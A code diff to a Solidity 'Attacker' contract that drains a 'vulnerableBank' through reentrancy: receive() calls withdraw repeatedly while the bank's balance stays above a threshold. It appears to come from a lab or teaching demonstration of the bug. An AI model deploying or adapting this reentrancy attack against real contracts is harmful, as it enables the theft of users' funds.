@@ -15,24 +15,21 @@ contract Attacker {
     }
 
     receive() external payable {
-        console.log("Recieve called");
-        if (address(vulnerableBank).balance >= 1 ether) {
+        if (address(vulnerableBank).balance >= 3 ether) {
             vulnerableBank.withdraw(1 ether);
         }
     }
 
-    fallback() external payable {
-        console.log("Fallback called");
-        if (address(vulnerableBank).balance >= 1 ether) {
-            vulnerableBank.withdraw(1 ether);
-        }
-    }
+    // fallback() external payable {
+    //     console.log("Fallback called");
+    //     if (address(vulnerableBank).balance >= 1 ether) {
+    //         vulnerableBank.withdraw(1 ether);
+    //     }
+    // }
 
     function attack() external payable {
         require(msg.value >= 1 ether, "Require at least 1 Ether to attack");
-
         vulnerableBank.deposit{value: 1 ether}();
-
         vulnerableBank.withdraw(1 ether);
     }
 
